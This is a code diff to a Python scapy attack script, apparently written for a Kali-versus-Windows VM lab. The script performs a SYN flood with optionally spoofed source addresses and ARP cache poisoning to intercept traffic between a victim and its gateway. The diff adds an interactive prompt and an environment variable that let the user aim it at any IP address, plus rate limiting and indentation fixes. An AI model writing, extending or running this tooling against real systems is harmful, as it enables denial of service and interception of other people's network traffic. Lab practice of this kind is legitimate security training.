@@ -16,6 +16,8 @@ Targets:
 import time
 import sys
 import threading
+import os
+import ipaddress
 
 try:
     from scapy.all import (
@@ -28,11 +30,12 @@ except ImportError:
     sys.exit(1)
 
 # ── Configuration ─────────────────────────────────────────────────────────────
-VICTIM_IP    = "192.168.56.20"    # Windows 10 VM
+VICTIM_IP    = os.environ.get("TARGET_IP", "192.168.56.20")    # Default target (can be overridden interactively)
 GATEWAY_IP   = "192.168.56.1"    # Host machine (vboxnet0)
 VICTIM_PORT  = 80                 # Port to SYN flood
 INTERFACE    = "eth0"             # Kali network interface (auto-detected if possible)
-
+USE_SPOOFED_SRC = os.environ.get("USE_SPOOFED_SRC", "false").lower() in {"1", "true", "yes"}
+SYN_FLOOD_PPS = int(os.environ.get("SYN_FLOOD_PPS", "50"))  # Packets per second (tunable; default 50)
 def _detect_iface():
     try:
         for name in get_if_list():
@@ -54,21 +57,27 @@ def syn_flood(stop_event):
     Sends bursts of TCP SYN packets to VICTIM_IP:VICTIM_PORT
     with randomised spoofed source IPs.
     The victim's SYN_RECV backlog fills up, making the port unresponsive.
+    Throttled to SYN_FLOOD_PPS packets per second to avoid overwhelming the backend.
     """
     iface = _detect_iface()
     print(f"[*] SYN Flood started → {VICTIM_IP}:{VICTIM_PORT} on {iface}")
-    burst_size  = 150
-    total_sent  = 0
+    print(f"[*] Rate limit: {SYN_FLOOD_PPS} pkt/s (set SYN_FLOOD_PPS env var to change)")
+    
+    burst_size = max(1, SYN_FLOOD_PPS // 10)  # Send in small bursts
+    delay_per_burst = burst_size / max(1, SYN_FLOOD_PPS)  # Delay between bursts
+    total_sent = 0
+    attacker_ip = get_if_addr(iface)
 
     while not stop_event.is_set():
         pkts = [
-            IP(src=RandIP(), dst=VICTIM_IP) /
+            IP(src=RandIP() if USE_SPOOFED_SRC else attacker_ip, dst=VICTIM_IP) /
             TCP(sport=RandShort(), dport=VICTIM_PORT, flags="S", seq=1000)
             for _ in range(burst_size)
         ]
         send(pkts, verbose=False, iface=iface)
         total_sent += burst_size
         print(f"  [SYN] Sent {total_sent:,} packets", end="\r")
+        time.sleep(delay_per_burst)  # Throttle to avoid backend overload
 
     print(f"\n[*] SYN Flood stopped — total packets sent: {total_sent:,}")
 
@@ -104,16 +113,16 @@ def arp_spoof(stop_event):
 
     while not stop_event.is_set():
         # Tell victim: "I am the gateway"
-           send(ARP(op=2,
-                 pdst=VICTIM_IP,  hwdst=victim_mac,
+        send(ARP(op=2,
+                 pdst=VICTIM_IP, hwdst=victim_mac,
                  psrc=GATEWAY_IP, hwsrc=my_mac),
-               verbose=False, iface=iface)
+             verbose=False, iface=iface)
 
         # Tell gateway: "I am the victim"
-           send(ARP(op=2,
+        send(ARP(op=2,
                  pdst=GATEWAY_IP, hwdst=gateway_mac,
-                 psrc=VICTIM_IP,  hwsrc=my_mac),
-               verbose=False, iface=iface)
+                 psrc=VICTIM_IP, hwsrc=my_mac),
+             verbose=False, iface=iface)
 
         count += 2
         print(f"  [ARP] Sent {count} poison packets", end="\r")
@@ -171,6 +180,26 @@ def main():
     print("=" * 60)
     print("  Attacker — Kali VM")
     print("=" * 60)
+    # Declare globals before use
+    global VICTIM_IP
+
+    # Allow user to enter a custom target IP interactively
+    default_target = VICTIM_IP
+    while True:
+        target_in = input(f"Target IP (press Enter for {default_target}): ").strip()
+        if not target_in:
+            target = default_target
+            break
+        try:
+            ipaddress.ip_address(target_in)
+            target = target_in
+            break
+        except Exception:
+            print("[!] Invalid IP address, try again.")
+
+    # Set the global VICTIM_IP to the chosen target
+    VICTIM_IP = target
+
     print(f"  Victim  : {VICTIM_IP}")
     print(f"  Gateway : {GATEWAY_IP}")
     print(f"  Interface: {INTERFACE}")
